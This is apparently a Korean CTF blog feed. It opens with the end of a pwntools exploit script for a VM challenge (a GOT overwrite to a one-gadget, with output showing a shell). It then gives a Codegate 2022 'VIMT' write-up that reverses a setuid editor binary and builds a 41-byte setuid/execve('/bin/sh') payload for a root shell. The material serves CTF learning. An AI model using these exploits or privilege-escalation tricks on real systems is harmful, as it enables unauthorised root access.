class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> __opcode(<span class="number">3</span>, pop1, pop2, args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> __opcode(<span class="number">6</span>, pop1, pop2, args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">pop, arg=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">10</span>) + (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(arg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># start race</span></span><br><span class="line">    payload = log(<span class="literal">False</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload += clean()</span><br><span class="line">        payload += sub(<span class="literal">False</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        payload += sub(<span class="literal">False</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        payload += pop()</span><br><span class="line">        payload += pop()</span><br><span class="line">        payload += pop()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set stack_idx to -59</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        payload += cmp(<span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload += sub(<span class="literal">True</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set puts.got to oneshot</span></span><br><span class="line">    payload += sub(<span class="literal">True</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0x3166e</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger oneshot</span></span><br><span class="line">    payload += log(<span class="literal">False</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;opcodes &gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 7777: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[!] I prepared <span class="built_in">log</span> feature <span class="keyword">for</span> you :)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[*] POP stack[0xffffffc5] == 0xf7a62aa0</span><br><span class="line">[*] PUSH stack[0xffffffc5] = 0xf7a31432</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] M. Dowd, J. McDonald and J. Schuh, “Chapter 13. Synchronization and State,” in <em>The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities</em>. Boston, MA: Addison-Wesley, 2006, pp. 797-821.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Codegate CTF 2022] VIMT</title>
    <url>/2022/07/05/codegate22-vimt/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>Monkeys help you</p>
</blockquote>
<p><a href="/uploads/codegate22-vimt/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>64비트 x86_64 바이너리 <code>app</code> 과 <code>Dockerfile</code> 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/vimt/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p><code>Dockerfile</code> 을 살펴보면 서버에서 바이너리에 setuid 권한을 부여하고 있으며, SSH 접속 가능한 계정과 비밀번호를 제공합니다. 따라서 주어진 바이너리를 통하여 root 권한의 셸을 획득하는 것이 목표임을 추측할 수 있습니다.</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;/home/ctf/app&quot;</span> &gt; /home/ctf/.bash_profile</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;exit&quot;</span> &gt;&gt; /home/ctf/.bash_profile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 640 /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> u+s /home/ctf/app</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf:ctf1234_smiley&#x27;</span> | chpasswd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s /bin/bash ctf</span></span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 문제의 이름처럼 Vim 에디터와 유사한 화면을 출력하는데, “hello world” 문자열을 입력했더니 각 문자 뒤에 쓰레기 값을 덧붙입니다.</p>
<p><img src="/images/codegate22-vimt/1.png" alt="1.png"></p>
<p><code>main</code> 함수에서 핵심적인 부분만 살펴보면 다음과 같습니다. 7행에서 <code>init</code> 함수를 호출하여 각종 전역 변수를 설정합니다. 15행에서 <code>getch</code> 함수로 문자를 입력받아 switch-case 구문에 넘깁니다. 문자가 Backspace인 경우 <code>deleteKey</code> 함수를 호출하고, 일반 문자의 경우 <code>inputKey</code> 함수를 호출하여 처리합니다. 문자가 Esc인 경우 Vim의 명령 모드(command mode)와 같이 <code>cmd</code> 에 추가적으로 커맨드를 입력받고, 52행부터 해당하는 커맨드의 함수를 호출합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">256uLL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">              <span class="keyword">while</span> ( !v3 )</span><br><span class="line">              &#123;</span><br><span class="line">                draw();</span><br><span class="line">                c = getch();</span><br><span class="line">                <span class="keyword">switch</span> ( c )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x1B</span>:                    <span class="comment">// Esc</span></span><br><span class="line">                                                <span class="comment">// switch to command mode</span></span><br><span class="line">                    v3 = <span class="number">1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n:&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x7F</span>:                    <span class="comment">// Backspace</span></span><br><span class="line">                    <span class="keyword">if</span> ( deleteKey() == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( cur_y &lt; y )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ++cur_y;</span><br><span class="line">                      cur_x = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( inputKey(c) == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">              _c = getch();</span><br><span class="line">              <span class="keyword">if</span> ( _c == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v4 &lt; <span class="number">255</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v0 = v4++;</span><br><span class="line">                cmd[v0] = _c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, _c);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;set&quot;</span>, cmd, <span class="number">3uLL</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;compile&quot;</span>, cmd, <span class="number">7uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( compile() != <span class="number">-1</span> )</span><br><span class="line">          <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">        v3 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( setAxis(cmd) != <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    v3 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>init</code> 함수는 6행에서 ioctl 시스템 콜을 호출하고, 결과를 전역 변수 <code>x</code> 와 <code>y</code> 에 대입합니다. <code>/usr/include/asm-generic/ioctls.h</code> 파일을 참고하면 요청 번호 <code>0x5413</code> 은 <code>TIOCGWINSZ</code> 로, 현재 터미널의 가로와 세로 크기를 구하는 요청입니다. 10행에서 터미널의 크기를 바탕으로 문자를 입력받을 2차원 배열 <code>map</code> 을 할당합니다. 16행에서는 각종 값으로 생성한 난수를 이용해 <code>rand</code> 함수의 seed를 초기화하고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ioctl(<span class="number">1</span>, <span class="number">0x5413</span>uLL, &amp;sz);                     <span class="comment">// ioctl(1, TIOCGWINSZ, &amp;sz)</span></span><br><span class="line">  x = sz.ws_col;</span><br><span class="line">  y = sz.ws_row - <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">map</span> = (<span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8LL</span> * (y + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">    <span class="built_in">map</span>[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, x + <span class="number">1</span>);</span><br><span class="line">  v3 = clock();</span><br><span class="line">  v2 = time(<span class="number">0LL</span>);</span><br><span class="line">  v0 = getpid();</span><br><span class="line">  seed = mix(v3, v2, v0);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>inputKey</code> 함수는 일반적인 문자 입력을 처리하는 함수입니다. <code>cur_x</code> , <code>cur_y</code> 는 현재 커서가 위치한 좌표를 나타내는 전역 변수로, 10행은 커서가 터미널의 가로 길이 끝까지 간 경우 줄바꿈하는 코드입니다. 19행에서 입력받은 문자를 2차원 배열 <code>map</code> 상에서 커서의 위치에 대입합니다. 20행의 반복문을 보면 문자 뒤로 랜덤한 5개의 문자를 추가하고 있는데, 이 부분의 코드가 원하는 문자열을 그대로 입력할 수 없었던 원인입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">inputKey</span><span class="params">(<span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> xpos; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> random_byte; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> *_row; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> _xpos; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_x = <span class="number">0</span>;</span><br><span class="line">    ++cur_y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">    cur_y = y - <span class="number">1</span>;</span><br><span class="line">  row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">  xpos = cur_x++;</span><br><span class="line">  row[xpos] = c;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      ++cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">      cur_y = y - <span class="number">1</span>;</span><br><span class="line">    random_byte = ascii[rand() % <span class="number">86</span>];</span><br><span class="line">    _row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    _xpos = cur_x++;</span><br><span class="line">    _row[_xpos] = random_byte;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>deleteKey</code> 함수는 Backspace 입력을 처리하는 함수입니다. Backspace를 한 번 입력할 때마다 반복문을 통해 현재 커서 위치에서 6개의 문자를 지웁니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">deleteKey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      --cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    row[--cur_x] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setAxis</code> 함수는 Esc 입력 후 “set y &lt;N&gt;” 커맨드를 처리하는 함수입니다. 21행에서 <code>cur_y</code> 전역 변수에 커맨드 매개변수로 전달된 정수 N을 대입합니다. 예를 들어 Esc 입력 후 &quot;set y 0&quot;을 입력하면, 커서의 세로축 위치가 첫 번째 줄로 이동합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">setAxis</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> _len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(cmd) &lt;= <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, len - <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">  v6 = cmd[<span class="number">4</span>];</span><br><span class="line">  _len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  <span class="built_in">memcpy</span>(s, cmd + <span class="number">6</span>, _len - <span class="number">6</span>);</span><br><span class="line">  n = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="string">&#x27;y&#x27;</span> &amp;&amp; v6 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= <span class="number">0</span> &amp;&amp; n &lt;= y - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_y = n;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>compile</code> 함수는 Esc 입력 후 “compile” 커맨드를 처리하는 함수입니다. 17~25행에서 <code>map</code> 의 내용을 <code>tmp/</code> 경로에 <code>.c</code> 확장자를 가진 파일로 저장합니다. 30행에서 <code>system</code> 함수를 호출하여 <code>gcc</code> 를 실행해 저장한 파일을 바이너리로 컴파일하고, 32행에서 성공하면 컴파일된 바이너리를 다시 <code>system</code> 함수로 실행합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">compile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  _map = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, (y + <span class="number">1</span>) * (x + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; x; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      _map[idx] = <span class="built_in">map</span>[i][j];</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  hexstring = randomHexString(<span class="number">32</span>);</span><br><span class="line">  hexstring_len = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  c_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, hexstring_len + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(c_file, <span class="string">&quot;tmp/%s.c&quot;</span>, hexstring);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  exec_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v1 + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(exec_file, <span class="string">&quot;tmp/%s&quot;</span>, hexstring);</span><br><span class="line">  fd = open(c_file, <span class="number">0x42</span>, <span class="number">420LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(_map);</span><br><span class="line">  write(fd, _map, v2);</span><br><span class="line">  close(fd);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(c_file);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(exec_file);</span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3 + v5 + <span class="number">9</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;gcc -o %s %s&quot;</span>, exec_file, c_file);</span><br><span class="line">  system(cmd);</span><br><span class="line">  <span class="keyword">if</span> ( !access(exec_file, <span class="number">0</span>) )</span><br><span class="line">    system(exec_file);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>문제 바이너리에 setuid 권한이 있으므로, 셸을 실행하는 C 소스 코드를 입력한 후 “compile” 커맨드로 컴파일하여 실행하면 root 권한의 셸을 얻을 수 있습니다. 다만  문자를 입력할 때마다 랜덤한 문자 5개가 함께 입력된다는 문제가 있는데, 터미널의 크기를 잘 조정하고 “set y &lt;N&gt;” 커맨드를 적절히 사용하면 원하는 문자열만 입력되도록 할 수 있습니다.</p>
<p>예를 들어 터미널의 가로 크기가 47일 때, “main()” 문자열을 입력해 보겠습니다. 먼저 첫 번째 문자인 ‘m’ 을 입력한 후 <code>map</code> 배열의 상태를 살펴보겠습니다. 초록색 문자는 입력한 문자, 흰색 문자는 랜덤으로 입력된 문자, 두꺼운 수직 바는 입력 후 커서의 위치를 나타냅니다. 입력한 ‘m’ 은 배열의 <code>map[0][0]</code> 에 저장됩니다.</p>
<p><img src="/images/codegate22-vimt/2.png" alt="2.png"></p>
<p>‘m’ 을 한번 더 입력해 보겠습니다. 이전의 입력에서 추가된 랜덤한 5바이트의 문자열로 인해, 이번 ‘m’ 은 배열의 <code>map[0][6]</code> 에 저장됩니다.</p>
<p><img src="/images/codegate22-vimt/3.png" alt="3.png"></p>
<p>이와 같이 ‘m’ 을 모두 8번 입력해 보겠습니다. 8번째로 입력한 ‘m’ 은 <code>map[0][42]</code> 에 저장됩니다. 이후 랜덤한 문자열이 추가되는데, 줄바꿈이 일어나 최종적으로 입력 후 커서의 위치가 <code>map[1][1]</code> 이 된 것을 확인할 수 있습니다.</p>
<p><img src="/images/codegate22-vimt/4.png" alt="4.png"></p>
<p>이 상태에서 “set y 0” 커맨드를 실행하면, <code>cur_y</code> 전역 변수의 값만 0으로 바뀌면서 커서의 위치가 <code>map[0][1]</code> 로 이동합니다.</p>
<p><img src="/images/codegate22-vimt/5.png" alt="5.png"></p>
<p>따라서 입력할 문자열의 두 번째 문자인 ‘a’ 를 입력하면, 의도했던 대로 ‘ma’ 를 입력할 수 있게 됩니다. 즉, 각 문자를 입력할 때마다 8번씩 입력한 후 “set y 0” 을 실행하면 모든 문자를 의도한 위치에 입력할 수 있습니다.</p>
<p><img src="/images/codegate22-vimt/6.png" alt="6.png"></p>
<p>이 방법을 사용하여 코드를 작성하기 위해서는 전체 코드에 줄바꿈이 없어야 하고, 코드의 길이가 터미널의 가로 크기인 47바이트보다 짧아야 합니다. 코드의 길이를 줄이기 위해 다음과 같은 <code>gcc</code> 의 트릭을 사용할 수 있습니다.</p>
<ol>
<li>함수 리턴 타입을 명시하지 않으면 기본값으로 <code>int</code> 를 반환합니다.</li>
<li>라이브러리 함수의 헤더를 <code>#include</code> 하지 않아도, 링킹 과정에서 동일한 프로토타입의 함수를 resolve하여 호출할 수 있도록 합니다.</li>
</ol>
<p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" target="_blank"><div class="link-preview-widget-title">Where does GCC find printf ? My code worked without any #include</div><div class="link-preview-widget-description">I am a C beginner so I tried to hack around the stuff.
I read stdio.h and I found this line:
extern int printf (const char *__restrict __format, ...);
So I wrote this code and i have no idea why it...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p>
<p>다음은 위의 트릭을 사용하여 작성한 셸을 실행하는 41바이트의 C 코드입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main() &#123;setuid(<span class="number">0</span>);execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>이 코드를 앞서 사용한 8번 입력 후 “set y 0” 커맨드를 실행하는 방법으로 입력한 후 <code>map</code> 배열의 상태는 다음과 같습니다. 커서는 <code>map[0][41]</code> 에 위치하고 있으며, <code>map[0]</code> 의 코드 뒷부분, <code>map[1]</code> 에 거쳐 랜덤한 문자들이 많이 남아있는 상황입니다.</p>
<p><img src="/images/codegate22-vimt/7.png" alt="7.png"></p>
<p>그런데 코드의 길이가 정확히 41바이트이므로, 현재 커서 위치에서 아무 문자 하나를 입력한 후(실제로는 6개가 입력됩니다) Backspace를 입력하여 <code>deleteKey</code> 함수를 호출하면 <code>map[0]</code> 의 뒷부분에 위치한 랜덤한 문자는 모두 지울 수 있습니다.</p>
<p>다음 그림에서 붉은 문자는 입력 후 Backspace에 지워지는 문자들입니다. <code>inputKey</code> 함수에서 줄바꿈은 새로운 문자를 입력받기 전 이전 입력에 대한 <code>cur_x</code> 값의 변화를 기준으로 수행합니다. <code>inputKey</code> 함수가 리턴한 이후 <code>deleteKey</code> 함수 호출 시점에서 커서의 위치는 줄바꿈이 아직 일어나지 않은 <code>map[0][47]</code> 이므로, 랜덤한 문자만 깔끔하게 지울 수 있게 됩니다.</p>
<p><img src="/images/codegate22-vimt/8.png" alt="8.png"></p>
<p>이후 “set y 1” 커맨드로 커서의 위치를 <code>map[1][41]</code> 로 옮긴 후, 동일하게 아무 문자 하나를 입력하고 Backspace를 8번 입력하면 <code>map[1]</code> 의 모든 문자를 지울 수 있습니다. 이제 의도했던 대로 정확히 소스 코드만 입력되었습니다. “compile” 커맨드로 바이너리를 컴파일한 후 실행하면 root 권한의 셸을 획득하게 됩니다.</p>
<p><img src="/images/codegate22-vimt/9.png" alt="9.png"></p>
<p>다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 4행은 <code>sshpass</code> 커맨드로 SSH 접속을 수행하고, 35행은 서버에서 <code>stty</code> 커맨드로 가상 터미널의 가로와 세로 크기를 지정합니다. 입력할 코드를 전송하는 과정에서 순서가 꼬여 실패하는 경우가 있는데, 익스플로잇 코드를 몇 번 실행하면 root 권한의 셸을 획득할 수 있습니다.</p>
